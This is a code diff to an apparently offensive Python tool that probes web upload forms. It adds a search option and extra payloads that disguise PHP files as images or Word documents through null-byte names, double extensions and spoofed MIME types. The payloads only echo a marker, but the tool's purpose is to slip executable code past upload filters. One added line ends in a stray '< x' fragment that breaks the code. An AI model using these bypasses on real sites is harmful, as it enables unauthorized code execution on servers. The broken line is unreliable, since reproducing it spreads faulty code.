@@ -40,6 +40,7 @@ parser.add_argument('-H', '--header', dest='header', default=None, help='Headers
 parser.add_argument('-d', '--details', dest='details', action='store_true', default=None, help='Show details of request / file send')
 parser.add_argument('-b', '--body', dest='body', default=None, help='Extra body (unused)')
 parser.add_argument('-i', '--dirb', dest='dirb', default=None, help='Wordlist to test url folder')
+parser.add_argument('-s', '--search', dest='search', action='store_true', help='Advanced research file (when u dont know where is your file)')
 #parser.add_argument('-p', '--perso', dest='perso', action='store_true', default=None, help='Personnalize your file to upload')
 args = parser.parse_args()
 #==========================FUNCTION=========================#
@@ -159,14 +160,14 @@ def find_uploaded_file(target_url, payload, returned_path,cookies=None, headers=
         if r.status_code == 200:
             print(f"[+] HIT -> {u}")
             return r.text, u
-
-    url_hit = search_from_hash(get_base_dir(target_url))
-    if url_hit:
-        r = session.get(url_hit, cookies=cookies, headers=headers)
-        if r.status_code == 200:
-            print(f"[+] HIT (By other url) -> {url_hit}")
-            quiet = True
-            return r.text, url_hit
+    if args.search:
+        url_hit = search_from_hash(get_base_dir(target_url))
+        if url_hit:
+            r = session.get(url_hit, cookies=cookies, headers=headers)
+            if r.status_code == 200:
+                print(f"[+] HIT (By other url) -> {url_hit}")
+                quiet = True
+                return r.text, url_hit
     return None, None
 #==============================FUNCTION==============================
 def search_from_hash(base):
@@ -217,7 +218,13 @@ payloads = {
     1: {"file_name": f"{hash}.php%00.png", "mime": "image/jpeg", "content": "<?php echo 'Ray manta upload'; ?>"},
     2: {"file_name": f"{hash}.php", "mime": "image/gif", "content": "<?php echo 'Ray manta upload'; ?>"},
     3: {"file_name": f"{hash}.gif", "mime": "application/x-php", "content": "<?php echo 'Ray manta upload'; ?>"},
-    4: {"file_name": f"{hash}.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
+    4: {"file_name": f"{hash}.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"},
+    
+    5: {"file_name": f"{hash}.docx", "mime": "text/plain", "content": "Ray manta upload"},
+    6: {"file_name": f"{hash}.php%00.docx", "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "content": "<?php echo 'Ray manta upload'; ?>"},
+    7: {"file_name": f"{hash}.php", "mime": "image/gif", "content": "<?php echo 'Ray manta upload'; ?>"},
+    8: {"file_name": f"{hash}.docx", "mime": "application/x-php", "content": "<?php echo 'Ray manta upload'; ?>"},
+    9: {"file_name": f"{hash}.php.docx", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
 }
 # \xff\xd8\xff\xe0
 #====================================OPTIONS====================================#
@@ -234,7 +241,7 @@ if args.url:
     vars = extract_vars(html)
 
     if len(vars) == 0:
-        print("[!] Aucun champ trouvé")
+        print("[!] Aucun champ trouvé")< x 
         print(exit_payload)
         exit()
     elif len(vars) == 1:
@@ -262,8 +269,6 @@ if args.url:
         if args.details:
             print(f"| Information file uploaded  | {payload}")
             print("#============================#=============================================================#")
-
-            
 
         if not res["success"]:
             print(f"[-] FAIL -> {res['error']}\n")
